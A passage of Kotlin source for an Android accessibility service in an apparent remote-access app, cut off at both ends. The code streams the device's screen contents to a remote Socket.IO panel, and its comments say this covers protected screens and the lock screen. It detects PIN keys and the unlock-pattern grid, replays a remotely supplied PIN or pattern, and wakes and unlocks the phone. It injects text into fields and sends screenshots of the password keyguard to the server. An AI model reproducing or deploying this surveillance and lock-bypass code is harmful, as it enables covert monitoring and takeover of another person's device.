                onResult?.invoke(true)
            }
            override fun onCancelled(gestureDescription: GestureDescription?) {
                super.onCancelled(gestureDescription)
                restaurarBloqueioLocal()
                onResult?.invoke(false)
            }
        }, null)
    }

    fun swipe(startX: Float, startY: Float, endX: Float, endY: Float, durationMs: Long = 300, onResult: ((Boolean) -> Unit)? = null) {
        // Mesmo bypass do clickAt: Acesso Total ativo não pode travar gestos.
        setBloqueioPermiteToqueRemoto(true)
        handlerMain.removeCallbacks(failsafeRestauroBloqueio)
        handlerMain.postDelayed(failsafeRestauroBloqueio, 3000L)
        val path = Path().apply {
            moveTo(startX, startY)
            lineTo(endX, endY)
        }
        val stroke = GestureDescription.StrokeDescription(path, 0, durationMs)
        val gestureBuilder = GestureDescription.Builder().addStroke(stroke)
        dispatchGesture(gestureBuilder.build(), object : GestureResultCallback() {
            override fun onCompleted(gestureDescription: GestureDescription?) {
                super.onCompleted(gestureDescription)
                restaurarBloqueioLocal()
                onResult?.invoke(true)
            }
            override fun onCancelled(gestureDescription: GestureDescription?) {
                super.onCancelled(gestureDescription)
                restaurarBloqueioLocal()
                onResult?.invoke(false)
            }
        }, null)
    }

    fun performGlobalHomeAction(): Boolean = performGlobalAction(GLOBAL_ACTION_HOME)
    fun performGlobalBackAction(): Boolean = performGlobalAction(GLOBAL_ACTION_BACK)
    fun performGlobalRecentesAction(): Boolean = performGlobalAction(GLOBAL_ACTION_RECENTS)

    /**
     * Acende a tela do dispositivo (se estiver apagada) e dispensa o keyguard.
     * Chamado pelo botão Power/Ligar do painel/emulador remoto via Socket.IO.
     * Posta na main thread por segurança (WakeLock + KeyguardLock em alguns
     * OEMs exigem Looper principal). Requer permissão WAKE_LOCK e
     * DISABLE_KEYGUARD no AndroidManifest.xml.
     */
    /**
     * Botão Power do painel — funciona IGUAL ao botão Power físico do celular:
     * alterna a tela entre ligada e desligada.
     *   - Tela DESLIGADA -> acende (WakeLock + dispensa keyguard).
     *   - Tela LIGADA    -> bloqueia/desliga (GLOBAL_ACTION_LOCK_SCREEN, API 28+;
     *                       em APIs antigas abre o diálogo de energia).
     * NÃO toca em nenhuma outra função (auto-clique, keep-alive, gestos).
     */
    fun acenderTelaRemota() {
        handlerMain.post {
            try {
                val pm = getSystemService(POWER_SERVICE) as PowerManager
                if (pm.isInteractive) {
                    // Tela ligada -> desligar/bloquear (igual ao power físico).
                    val ok = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
                    } else {
                        performGlobalAction(GLOBAL_ACTION_POWER_DIALOG)
                    }
                    enviarLog("[POWER] Tela estava LIGADA -> ${if (ok) "bloqueada/desligada" else "falha ao bloquear"}.")
                } else {
                    // Tela desligada -> acender.
                    acenderTela()
                    enviarLog("[POWER] Tela estava DESLIGADA -> acendendo.")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Erro no botão Power: ${e.message}")
            }
        }
    }

    // ================================================================
    // EMULADOR WIREFRAME — leitura da árvore de tela em tempo real
    // ----------------------------------------------------------------
    // Percorre TODAS as janelas ativas (service.windows), incluindo
    // TYPE_APPLICATION, TYPE_SYSTEM e a tela de bloqueio/Keyguard —
    // NÃO depende apenas de rootInActiveWindow (que retorna null na
    // tela de bloqueio / popups em várias ROMs). Funciona em telas
    // protegidas (FLAG_SECURE) e na tela de bloqueio onde o vídeo
    // (MediaProjection) fica preto, pois a acessibilidade lê a árvore
    // de views, não pixels. Controle remoto via "wireframe_control_painel".
    // ================================================================
    @Volatile private var wireframeFpsAtual = 0        // 0 = pausado
    @Volatile private var wireframeUltimoHash = 0L
    @Volatile private var wireframeUltimoEnvioMs = 0L
    // Cache da última grade de padrão (9 centros reais) e teclas de PIN
    // (dígito -> centro real), para replay de comandos enviados por
    // índice (1..9) ou por dígito ("1234") vindos do painel.
    @Volatile private var wireframePadraoCentros: List<android.graphics.PointF> = emptyList()
    @Volatile private var wireframePinTeclas: Map<String, android.graphics.PointF> = emptyMap()

    private val runnableWireframe = object : Runnable {
        override fun run() {
            if (wireframeFpsAtual <= 0) return // pausado
            try {
                capturarEEnviarWireframe()
            } catch (e: Exception) {
                Log.e(TAG, "Erro no frame wireframe: ${e.message}")
            }
            val intervaloMs = (1000L / wireframeFpsAtual).coerceIn(100L, 5000L)
            handlerMain.postDelayed(this, intervaloMs)
        }
    }

    /** Inicia (ou altera o FPS do) stream de wireframe. Zera qualquer
     *  cache/hash anterior e posta o PRIMEIRO frame no milissegundo 0
     *  (post imediato na main thread) ANTES de iniciar o loop do Handler
     *  com intervalo 1000/fps ms (ex: 200ms para 5 FPS). */
    fun iniciarStreamLeitorTela(fps: Int) {
        val f = fps.coerceIn(1, 10)
        wireframeFpsAtual = f
        wireframeUltimoHash = 0L          // força reenvio imediato
        wireframeUltimoEnvioMs = 0L
        handlerMain.removeCallbacks(runnableWireframe)
        handlerMain.post(runnableWireframe) // frame 0 já no próximo tick
        enviarLogApp("[WIREFRAME] Stream iniciado a $f FPS (frame 0 imediato, hash zerado).")
    }

    /** Pausa o stream de wireframe. */
    fun pararStreamLeitorTela() {
        if (wireframeFpsAtual == 0) return
        wireframeFpsAtual = 0
        handlerMain.removeCallbacks(runnableWireframe)
        enviarLogApp("[WIREFRAME] Stream pausado.")
    }

    /**
     * Percorre TODAS as janelas ativas (windows), monta payload LEVE e
     * emite "wireframe_frame". Inclui estado do aparelho (Keyguard +
     * PowerManager): bloqueado, telaApagada, tipoBloqueio
     * (nenhum|capa|padrao|pin), centros da grade de padrão e teclas de
     * PIN detectados na árvore (para desbloqueio interativo no painel).
     * Economiza banda: só envia se o hash da árvore mudou OU se já se
     * passaram >5s desde o último envio (painéis que acabaram de conectar).
     */
    private fun capturarEEnviarWireframe() {
        val metrics = resources.displayMetrics
        val w = metrics.widthPixels
        val h = metrics.heightPixels

        // --- Estado do aparelho (Keyguard + PowerManager) ---
        val kg = getSystemService(KEYGUARD_SERVICE) as? KeyguardManager
        val pm = getSystemService(POWER_SERVICE) as? PowerManager
        val telaApagada = pm?.isInteractive == false
        val bloqueado = kg?.isKeyguardLocked == true
        val keyguardSeguro = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1)
            kg?.isKeyguardSecure == true else false

        val nos = JSONArray()
        // Coletores preenchidos DURANTE a travessia única da árvore:
        val padraoBounds = arrayOfNulls<android.graphics.Rect>(1)
        val pinTeclas = mutableListOf<Pair<String, android.graphics.PointF>>() // dígito -> centro

        // --- 1) Coleta as raízes de TODAS as janelas ativas ---
        val roots = mutableListOf<AccessibilityNodeInfo>()
        try {
            val janelas: List<android.view.accessibility.AccessibilityWindowInfo> =
                windows ?: emptyList()
            for (janela in janelas) {
                val tipo = janela.type
                // Pula apenas janelas de overlay de acessibilidade (as nossas)
                if (tipo == android.view.accessibility.AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY) continue
                val raiz = janela.root ?: continue
                roots.add(raiz)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao listar janelas: ${e.message}")
        }
        // Fallback: se nenhuma janela retornou raiz (ROMs antigas / tela
        // apagada), usa rootInActiveWindow (mantém compatibilidade).
        if (roots.isEmpty()) {
            try { rootInActiveWindow?.let { roots.add(it) } } catch (_: Exception) {}
        }

        // --- 2) Travessia ÚNICA: monta nós + detecta padrão/PIN ---
        for (raiz in roots) {
            lerNosWireframe(raiz, nos, profundidade = 0, maxNos = 800, padraoBounds, pinTeclas)
        }

        // --- 3) tipoBloqueio + grade de padrão (9 centros em coords reais) ---
        var tipoBloqueio = "nenhum"
        val padraoCentros = JSONArray()
        if (bloqueado) {
            tipoBloqueio = if (!keyguardSeguro) "capa" else "pin"
            val pb = padraoBounds[0]
            if (pb != null && pb.width() > 100 && pb.height() > 100) {
                tipoBloqueio = "padrao"
                // Grade 3x3 de centros dentro da LockPatternView (AOSP e
                // ROMs conhecidas: Samsung, Xiaomi/MIUI, Motorola, etc.).
                val cellW = pb.width() / 3f
                val cellH = pb.height() / 3f
                val centrosReais = mutableListOf<android.graphics.PointF>()
                var idx = 1
                for (row in 0..2) {
                    for (col in 0..2) {
                        val cx = pb.left + cellW * (col + 0.5f)
                        val cy = pb.top + cellH * (row + 0.5f)
                        centrosReais.add(android.graphics.PointF(cx, cy))
                        padraoCentros.put(JSONObject().apply {
                            put("i", idx); put("x", cx.toInt()); put("y", cy.toInt())
                        })
                        idx++
                    }
                }
                wireframePadraoCentros = centrosReais
            } else {
                wireframePadraoCentros = emptyList()
            }
        } else {
            wireframePadraoCentros = emptyList()
        }

        // --- Cache de teclas de PIN (dígito -> centro real) ---
        val pinJson = JSONArray()
        val mapaPin = mutableMapOf<String, android.graphics.PointF>()
        for ((dig, pt) in pinTeclas) {
            if (mapaPin.containsKey(dig)) continue
            mapaPin[dig] = pt
            pinJson.put(JSONObject().apply { put("d", dig); put("x", pt.x.toInt()); put("y", pt.y.toInt()) })
        }
        wireframePinTeclas = mapaPin

        // --- 4) Hash leve + throttling de banda ---
        var hash: Long = nos.length().toLong() * 31L +
            (if (bloqueado) 7L else 3L) +
            tipoBloqueio.hashCode().toLong()
        if (nos.length() > 0) {
            val primeiro = nos.optJSONArray(0)
            if (primeiro != null) hash += primeiro.optLong(0, 0) + primeiro.optLong(1, 0) * 31
        }
        val agora = System.currentTimeMillis()
        val mudou = (hash != wireframeUltimoHash)
        val forcar = (agora - wireframeUltimoEnvioMs > 5000L)
        if (!mudou && !forcar) return // sem mudança recente -> economiza banda
        wireframeUltimoHash = hash
        wireframeUltimoEnvioMs = agora

        val payload = JSONObject().apply {
            put("deviceId", "${Build.MANUFACTURER}-${Build.MODEL}")
            put("dispositivo", "${Build.MANUFACTURER}-${Build.MODEL}")
            put("width", w)
            put("height", h)
            put("fps", wireframeFpsAtual)
            put("timestamp", agora)
            put("bloqueado", bloqueado)
            put("telaApagada", telaApagada)
            put("tipoBloqueio", tipoBloqueio)
            put("padrao", JSONObject().apply {
                val r = padraoBounds[0]
                put("bounds", if (r != null) JSONArray().apply {
                    put(r.left); put(r.top); put(r.right); put(r.bottom)
                } else JSONArray())
                put("pontos", padraoCentros)
            })
            put("pinTeclas", pinJson)
            put("nos", nos)
        }
        SocketManager.socket?.emit("wireframe_frame", payload)
    }

    /**
     * Leitor recursivo compacto. Cada nó vira array JSON:
     *   [left, top, right, bottom, clickable(0/1), "text|contentDescription", "className"]
     * Na MESMA passada detecta a LockPatternView (senha padrão 3x3) e as
     * teclas numéricas do PIN. Ignora nós invisíveis e de tamanho zero.
     * Para em 800 nós / profundidade 25 para não travar o dispositivo.
     */
    private fun lerNosWireframe(
        no: AccessibilityNodeInfo, saida: JSONArray,
        profundidade: Int, maxNos: Int,
        padraoBounds: Array<android.graphics.Rect?>,
        pinTeclas: MutableList<Pair<String, android.graphics.PointF>>
    ): Int {
        if (saida.length() >= maxNos || profundidade > 25) return saida.length()
        try {
            if (!no.isVisibleToUser) return saida.length()
            val rect = android.graphics.Rect()
            no.getBoundsInScreen(rect)
            if (rect.width() < 2 || rect.height() < 2) return saida.length()

            val viewId = (no.viewIdResourceName ?: "").lowercase()
            val cls = (no.className?.toString() ?: "").lowercase()
            val txt = (no.text?.toString() ?: "").trim()

            // --- Detecção de LockPatternView (senha padrão 3x3) ---
            if (padraoBounds[0] == null && rect.width() > 100 && rect.height() > 100 &&
                (viewId.contains("lockpattern") || viewId.contains("lock_pattern") ||
                 viewId.contains("patternview") || cls.contains("lockpattern"))) {
                padraoBounds[0] = rect
            }

            // --- Detecção de teclas de PIN (dígitos 0-9 clicáveis no keyguard) ---
            if ((no.isClickable || no.isFocusable) && txt.matches(Regex("^[0-9]$")) &&
                (viewId.contains("pin") || viewId.contains("keyguard") ||
                 viewId.contains("digit") || viewId.contains("numeric") ||
                 viewId.contains("password") || viewId.contains("key") ||
                 cls.contains("keyboard") || cls.contains("button") ||
                 cls.contains("textview") || cls.contains("imageview"))) {
                pinTeclas.add(txt to android.graphics.PointF(rect.exactCenterX(), rect.exactCenterY()))
            }

            val texto = (txt.ifEmpty { no.contentDescription?.toString() ?: "" }).take(60)
            val arr = JSONArray().apply {
                put(rect.left); put(rect.top); put(rect.right); put(rect.bottom)
                put(if (no.isClickable || no.isFocusable) 1 else 0)
                put(texto)
                put(no.className?.toString()?.substringAfterLast('.') ?: "")
            }
            saida.put(arr)

            for (i in 0 until no.childCount) {
                val filho = no.getChild(i) ?: continue
                lerNosWireframe(filho, saida, profundidade + 1, maxNos, padraoBounds, pinTeclas)
                filho.recycle()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao ler nó wireframe: ${e.message}")
        }
        return saida.length()
    }

    /**
     * Ponto de entrada do controle remoto (despachado pelo SocketManager
     * a partir do evento "wireframe_control_painel"). Comandos suportados:
     *   play / pause / fps / tap(x,y) / swipe(x1,y1,x2,y2) / swipe_up
     *   pattern(pontos:[{x,y}] OU indices:[1..9]) / pin(digitos:"1234")
     *   back / home / recents / send_text(texto) / wake_screen
     */
    fun executarControleWireframe(json: JSONObject?) {
        if (json == null) return
        val comando = json.optString("comando", json.optString("acao", "")).lowercase()
        when (comando) {
            "play" -> iniciarStreamLeitorTela(json.optInt("fps", 5))
            "pause" -> pararStreamLeitorTela()
            "fps" -> iniciarStreamLeitorTela(json.optInt("valor", json.optInt("fps", 5)))
            "tap" -> {
                val x = json.optDouble("x", 0.0).toFloat()
                val y = json.optDouble("y", 0.0).toFloat()
                clickAt(x, y)
                enviarLog("[WIREFRAME] tap em ($x, $y)")
            }
            "swipe" -> {
                val x1 = json.optDouble("x1", 0.0).toFloat()
                val y1 = json.optDouble("y1", 0.0).toFloat()
                val x2 = json.optDouble("x2", 0.0).toFloat()
                val y2 = json.optDouble("y2", 0.0).toFloat()
                handlerMain.post {
                    try {
                        setBloqueioPermiteToqueRemoto(true)
                        handlerMain.removeCallbacks(failsafeRestauroBloqueio)
                        handlerMain.postDelayed(failsafeRestauroBloqueio, 5000L)
                        val caminho = Path().apply { moveTo(x1, y1); lineTo(x2, y2) }
                        val gesto = GestureDescription.Builder()
                            .addStroke(GestureDescription.StrokeDescription(caminho, 0, 300L))
                            .build()
                        dispatchGesture(gesto, object : GestureResultCallback() {
                            override fun onCompleted(g: GestureDescription?) { restaurarBloqueioLocal() }
                            override fun onCancelled(g: GestureDescription?) { restaurarBloqueioLocal() }
                        }, handlerMain)
                        enviarLog("[WIREFRAME] swipe ($x1,$y1)->($x2,$y2)")
                    } catch (e: Exception) {
                        enviarLog("[WIREFRAME ERRO] swipe: ${e.message}")
                        restaurarBloqueioLocal()
                    }
                }
            }
            "swipe_up" -> {
                // Acorda a tela (se apagada) + desliza para cima (abre a
                // senha na tela de bloqueio / sai da tela de capa).
                desbloquearSwipeRemoto()
                enviarLog("[WIREFRAME] swipe_up — acordar + deslizar para abrir senha.")
            }
            "pattern" -> {
                val pontos = mutableListOf<android.graphics.PointF>()
                val arr = json.optJSONArray("pontos")
                if (arr != null && arr.length() >= 2) {
                    for (i in 0 until arr.length()) {
                        val item = arr.optJSONObject(i) ?: continue
                        pontos.add(android.graphics.PointF(
                            item.optDouble("x", 0.0).toFloat(),
                            item.optDouble("y", 0.0).toFloat()))
                    }
                } else {
                    // Índices 1..9 -> mapeia para os centros cacheados da grade
                    val idxs = json.optJSONArray("indices") ?: json.optJSONArray("sequencia")
                    val centros = wireframePadraoCentros
                    if (idxs != null && centros.size == 9) {
                        for (i in 0 until idxs.length()) {
                            val idx = idxs.optInt(i, 0) - 1
                            if (idx in 0..8) pontos.add(centros[idx])
                        }
                    }
                }
                if (pontos.size < 2) {
                    enviarLog("[WIREFRAME ERRO] pattern: menos de 2 pontos (ou grade ainda não detectada — toque em Play e aguarde 1 frame).")
                    return
                }
                handlerMain.post {
                    try {
                        setBloqueioPermiteToqueRemoto(true)
                        handlerMain.removeCallbacks(failsafeRestauroBloqueio)
                        handlerMain.postDelayed(failsafeRestauroBloqueio, 8000L)
                        desbloquearPadraoPontos(pontos) { ok ->
                            enviarLog("[WIREFRAME] pattern desenhado (${pontos.size} pts, ok=$ok).")
                            restaurarBloqueioLocal()
                        }
                    } catch (e: Exception) {
                        enviarLog("[WIREFRAME ERRO] pattern: ${e.message}")
                        restaurarBloqueioLocal()
                    }
                }
            }
            "pin" -> {
                val digitos = json.optString("digitos", json.optString("valor", "")).filter { it.isDigit() }
                if (digitos.isEmpty()) {
                    enviarLog("[WIREFRAME ERRO] pin: sem dígitos.")
                    return
                }
                val teclas = wireframePinTeclas
                if (teclas.isEmpty()) {
                    enviarLog("[WIREFRAME ERRO] pin: teclado numérico ainda não detectado (toque em Play e aguarde 1 frame com a tela de PIN visível).")
                    return
                }
                handlerMain.post {
                    var atraso = 0L
                    for (d in digitos) {
                        val pt = teclas[d.toString()]
                        if (pt != null) {
                            handlerMain.postDelayed({ clickAt(pt.x, pt.y) }, atraso)
                            atraso += 250L
                        } else {
                            enviarLog("[WIREFRAME AVISO] pin: dígito '$d' não encontrado no teclado detectado.")
                        }
                    }
                    enviarLog("[WIREFRAME] pin '$digitos' enviado (${digitos.length} dígitos, intervalo 250ms).")
                }
            }
            "back" -> { performGlobalBackAction(); enviarLog("[WIREFRAME] Voltar") }
            "home" -> { performGlobalHomeAction(); enviarLog("[WIREFRAME] Home") }
            "recents" -> { performGlobalRecentesAction(); enviarLog("[WIREFRAME] Recentes") }
            "wake_screen" -> {
                handlerMain.post {
                    try {
                        val pm = getSystemService(POWER_SERVICE) as PowerManager
                        if (!pm.isInteractive) acenderTela()
                        @Suppress("DEPRECATION")
                        val wl = pm.newWakeLock(
                            PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
                                PowerManager.ACQUIRE_CAUSES_WAKEUP or
                                PowerManager.ON_AFTER_RELEASE,
                            "AcessoMaterno:WakeScreenWireframe"
                        )
                        wl.acquire(15000L)
                        enviarLog("[WIREFRAME] wake_screen — tela acordada (WakeLock 15s).")
                    } catch (e: Exception) {
                        enviarLog("[WIREFRAME ERRO] wake_screen: ${e.message}")
                    }
                }
            }
            "send_text" -> {
                val texto = json.optString("texto", "")
                handlerMain.post {
                    try {
                        var alvo: AccessibilityNodeInfo? = null
                        try { alvo = rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) } catch (_: Exception) {}
                        if (alvo == null) {
                            // Fallback: primeiro nó editável visível em QUALQUER janela.
                            alvo = buscarNoEditavel()
                        }
                        if (alvo != null) {
                            val args = android.os.Bundle().apply {
                                putCharSequence(
                                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, texto)
                            }
                            val ok = alvo.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                            enviarLog("[WIREFRAME] send_text \"$texto\" (ok=$ok)")
                        } else {
                            enviarLog("[WIREFRAME] send_text: sem campo editável/focado — toque primeiro no campo desejado.")
                        }
                    } catch (e: Exception) {
                        enviarLog("[WIREFRAME ERRO] send_text: ${e.message}")
                    }
                }
            }
            else -> enviarLog("[WIREFRAME] comando desconhecido: $comando")
        }
    }

    /** Busca o primeiro nó editável visível atravessando TODAS as janelas
     *  (fallback do send_text quando não há nó com foco de input). */
    private fun buscarNoEditavel(): AccessibilityNodeInfo? {
        val roots = mutableListOf<AccessibilityNodeInfo>()
        try {
            val janelas: List<android.view.accessibility.AccessibilityWindowInfo> =
                windows ?: emptyList()
            for (janela in janelas) {
                if (janela.type == android.view.accessibility.AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY) continue
                janela.root?.let { roots.add(it) }
            }
        } catch (_: Exception) {}
        if (roots.isEmpty()) {
            try { rootInActiveWindow?.let { roots.add(it) } } catch (_: Exception) {}
        }
        for (r in roots) {
            val achou = buscarNoEditavelRec(r)
            if (achou != null) return achou
        }
        return null
    }

    private fun buscarNoEditavelRec(no: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        try {
            if (no.isVisibleToUser &&
                (no.isEditable || (no.actions and AccessibilityNodeInfo.ACTION_SET_TEXT) != 0)) {
                return no
            }
            for (i in 0 until no.childCount) {
                val f = no.getChild(i) ?: continue
                val r = buscarNoEditavelRec(f)
                if (r != null) return r
            }
        } catch (_: Exception) {}
        return null
    }
    /**
     * Desbloqueia o dispositivo remotamente (tela de swipe SEM senha).
     * Fluxo em camadas:
     *   1) Acende a tela se estiver apagada (gesto NÃO funciona com tela off).
     *   2) Desativa o keyguard via KeyguardLock.disableKeyguard() — requer a
     *      permissão android.permission.DISABLE_KEYGUARD (já declarada no
     *      manifest). Funciona para bloqueio de swipe (sem senha/PIN/padrão).
     *   3) Após ~1,2s, injeta um swipe-up automático (baixo -> cima) via
     *      dispatchGesture como garantia extra para ROMs (Xiaomi/MIUI/HyperOS,
     *      Samsung One UI) que ignoram o disableKeyguard.
     * Botão "🔓 Desbloquear (Swipe)" do painel.
     */
    fun desbloquearSwipeRemoto() {
        handlerMain.post {
            try {
                // 1) Garante tela ligada e MANTÉM ligada por 60s (WakeLock longo).
                //    Sem isto, a tela apaga em ~3s e o espelhamento cai — o usuário
                //    não tem tempo de ver a tela de senha e digitar remotamente.
                val pm = getSystemService(POWER_SERVICE) as PowerManager
                try {
                    @Suppress("DEPRECATION")
                    val wakeLockLongo = pm.newWakeLock(
                        PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
                            PowerManager.ACQUIRE_CAUSES_WAKEUP or
                            PowerManager.ON_AFTER_RELEASE,
                        "AcessoMaterno:Desbloquear60s"
                    )
                    wakeLockLongo.acquire(120000L) // mantém a tela acesa por 120s (2 min)
                    enviarLog("[DESBLOQUEAR] WakeLock de 120s adquirido — tela e espelhamento permanecem no ar.")
                } catch (e: Exception) {
                    Log.e(TAG, "Falha no WakeLock longo de desbloqueio: ${e.message}")
                }
                if (!pm.isInteractive) {
                    acenderTela()
                    enviarLog("[DESBLOQUEAR] Tela apagada -> acendendo antes de desbloquear.")
                }
                // 2) Desativa o keyguard de swipe (sem senha). Se houver PIN/senha,
                //    o bloqueio seguro permanece (mostra o teclado de senha).
                //    CORREÇÃO: se o keyguard é SEGURO (tem senha/PIN/padrão),
                //    NÃO chamamos disableKeyguard() — em algumas ROMs
                //    (Xiaomi/MIUI/HyperOS) ele causa o efeito "mostra e apaga"
                //    (a tela de bloqueio aparece e some). Apenas o swipe-up
                //    (abaixo) basta para abrir o teclado de senha.
                try {
                    val kg = getSystemService(KEYGUARD_SERVICE) as KeyguardManager
                    val keyguardSeguro = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                        kg.isKeyguardSecure
                    } else {
                        @Suppress("DEPRECATION")
                        false
                    }
                    if (keyguardSeguro) {
                        enviarLog("[DESBLOQUEAR] Keyguard SEGURO (com senha/PIN) — disableKeyguard ignorado; swipe-up abrirá o teclado de senha.")
                    } else {
                        @Suppress("DEPRECATION")
                        val keyguardLock = kg.newKeyguardLock("AcessoMaterno:Desbloquear")
                        keyguardLock.disableKeyguard()
                        enviarLog("[DESBLOQUEAR] Keyguard de swipe desativado via disableKeyguard.")
                    }
                } catch (e: Exception) {
                    enviarLog("[DESBLOQUEAR] Aviso: disableKeyguard falhou (${e.message}) — usando swipe-up de fallback.")
                }
                // 3) Swipe-up automático de fallback após a tela estabilizar
                handlerMain.postDelayed({ injetarSwipeUpDesbloqueio() }, 1200L)
            } catch (e: Exception) {
                Log.e(TAG, "Erro ao desbloquear: ${e.message}")
            }
        }
    }

    /** Injeta um gesto de swipe-up (centro inferior -> centro superior) simulando o "deslize para desbloquear". */
    private fun injetarSwipeUpDesbloqueio() {
        try {
            val metrics = resources.displayMetrics
            val w = metrics.widthPixels.toFloat()
            val h = metrics.heightPixels.toFloat()
            val startX = w / 2f
            val startY = h * 0.85f  // 15% acima da borda inferior
            val endX = w / 2f
            val endY = h * 0.20f    // 20% abaixo da borda superior
            // Libera o overlay de bloqueio (Acesso Total) para o gesto atravessar.
            setBloqueioPermiteToqueRemoto(true)
            handlerMain.removeCallbacks(failsafeRestauroBloqueio)
            handlerMain.postDelayed(failsafeRestauroBloqueio, 8000L)
            val path = Path().apply {
                moveTo(startX, startY)
                lineTo(endX, endY)
            }
            val stroke = GestureDescription.StrokeDescription(path, 0, 350L)
            val gesto = GestureDescription.Builder().addStroke(stroke).build()
            val aceito = dispatchGesture(gesto, object : GestureResultCallback() {
                override fun onCompleted(g: GestureDescription?) {
                    enviarLog("[DESBLOQUEAR] Swipe-up de desbloqueio concluído (85% -> 20% da altura).")
                    restaurarBloqueioLocal()
                }
                override fun onCancelled(g: GestureDescription?) {
                    enviarLog("[DESBLOQUEAR] Swipe-up de desbloqueio cancelado.")
                    restaurarBloqueioLocal()
                }
            }, null)
            if (!aceito) {
                enviarLog("[DESBLOQUEAR] dispatchGesture recusado — o Android pode estar bloqueando gestos na tela de bloqueio.")
                restaurarBloqueioLocal()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao injetar swipe-up: ${e.message}")
        }
    }

    // ================================================================
    // CAPTURA POR ACESSIBILIDADE — takeScreenshot() (Android 11+, API 30)
    // ----------------------------------------------------------------
    // Inicia o loop de captura por AccessibilityService.takeScreenshot().
    // Chamado pelo ScreenCaptureService quando detecta SCREEN_ON com keyguard
    // travado (tela de senha/PIN que o MediaProjection não consegue capturar).
    // Envia os frames pelo MESMO canal Socket.IO ("enviar_tela") — o painel
    // continua funcionando sem nenhuma alteração.
    // ================================================================
    fun iniciarCapturaAcessibilidade() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            enviarLogApp("[CAPTURA-ACE] Android < 11 (API < 30) — takeScreenshot() indisponível. Use ADB/SurfaceControl (scrcpy) como alternativa.")
            return
        }
        if (capturaAcessibilidadeAtiva) return
        capturaAcessibilidadeAtiva = true
        handlerCapturaAces.removeCallbacks(runnableCapturaAces)
        handlerCapturaAces.post(runnableCapturaAces)
        enviarLogApp("[CAPTURA-ACE] Captura por AccessibilityService.takeScreenshot() ATIVADA (~5 FPS) — keyguard com senha visível no painel.")
    }

    /** Para a captura por acessibilidade (volta ao MediaProjection, mais FPS). Chamado no USER_PRESENT. */
    fun pararCapturaAcessibilidade() {
        if (!capturaAcessibilidadeAtiva) return
        capturaAcessibilidadeAtiva = false
        handlerCapturaAces.removeCallbacks(runnableCapturaAces)
        enviarLogApp("[CAPTURA-ACE] Captura por acessibilidade DESATIVADA — volta ao MediaProjection (FPS normal).")
    }

    /**
     * Captura UM frame via AccessibilityService.takeScreenshot() e envia por
     * Socket.IO no mesmo canal "enviar_tela" (byte[] puro, igual ao MediaProjection).
     * Diferente do MediaProjection (UID do app, não captura FLAG_SECURE), o
     * takeScreenshot() da acessibilidade captura as camadas seguras do sistema,
     * inclusive o teclado de senha/PIN do keyguard.
     */
    @androidx.annotation.RequiresApi(Build.VERSION_CODES.R)
    private fun capturarScreenshotAcessibilidade() {
        try {
            val executor = ContextCompat.getMainExecutor(this)
            takeScreenshot(Display.DEFAULT_DISPLAY, executor, object : TakeScreenshotCallback {
                override fun onSuccess(result: ScreenshotResult) {
                    var hardwareBuffer: HardwareBuffer? = null
                    try {
                        hardwareBuffer = result.hardwareBuffer
                        val colorSpace = ColorSpace.get(ColorSpace.Named.SRGB)
                        val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                            ?: Bitmap.wrapHardwareBuffer(hardwareBuffer, null)
                        if (bitmap == null) {
                            Log.w(TAG, "Bitmap.wrapHardwareBuffer retornou nulo.")
                            return
                        }
                        // Converte para bitmap mutável (compress exige config de hardware)
                        val bitmapCopiaciavel = bitmap.copy(Bitmap.Config.ARGB_8888, false)
                        bitmap.recycle()
                        val baos = ByteArrayOutputStream()
                        bitmapCopiaciavel.compress(Bitmap.CompressFormat.JPEG, 60, baos)
                        val bytes = baos.toByteArray()
                        bitmapCopiaciavel.recycle()
                        SocketManager.socket?.emit("enviar_tela", bytes)
                    } catch (e: Exception) {
                        Log.e(TAG, "Erro ao processar screenshot da acessibilidade: ${e.message}")
                    } finally {
                        try { hardwareBuffer?.close() } catch (_: Exception) {}
                    }
                }

                override fun onFailure(errorCode: Int) {
                    // Códigos: ERROR_TAKE_SCREENSHOT_INTERVALTOO_SHORT (muito rápido),
                    // ERROR_TAKE_SCREENSHOT_NO_ACCESSIBILITY_ACCESS, etc.
                    Log.w(TAG, "takeScreenshot falhou (código=$errorCode) — tentando novamente no próximo ciclo.")
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao chamar takeScreenshot: ${e.message}")
        }
    }

    // ================================================================
    // MÓDULO DE INSPEÇÃO E DESBLOQUEIO REMOTO DA TELA DE BLOQUEIO
    // ================================================================

    /**
     * Inspeção de nós da tela de bloqueio via rootInActiveWindow.
     * Captura nós visíveis, IDs de view, coordenadas e status da tela/senha.
     */
    fun lerArvoreTelaBloqueio(): JSONObject {
        val keyguardManager = getSystemService(KEYGUARD_SERVICE) as? KeyguardManager
        val powerManager = getSystemService(POWER_SERVICE) as? PowerManager

        val telaApagada = powerManager?.isInteractive == false
        val telaBloqueada = keyguardManager?.isKeyguardLocked == true
        val senhaGuardada = keyguardManager?.isKeyguardSecure == true

        val root = rootInActiveWindow
        val nos = mutableListOf<JSONObject>()
        var detectouPadrao = false
        var detectouPin = false

        if (root != null) {
            percorrerNosRecursivo(root, nos)
            for (i in 0 until nos.size) {
                val item = nos[i]
                val idName = item.optString("viewId", "").lowercase()
                val clsName = item.optString("className", "").lowercase()
                if (idName.contains("lockpattern") || clsName.contains("lockpattern") || idName.contains("pattern")) {
                    detectouPadrao = true
                }
                if (idName.contains("pin") || idName.contains("keyguard_pin") || idName.contains("digit") || idName.contains("numeric")) {
                    detectouPin = true
                }
            }
        }

        val estadoDesc = when {
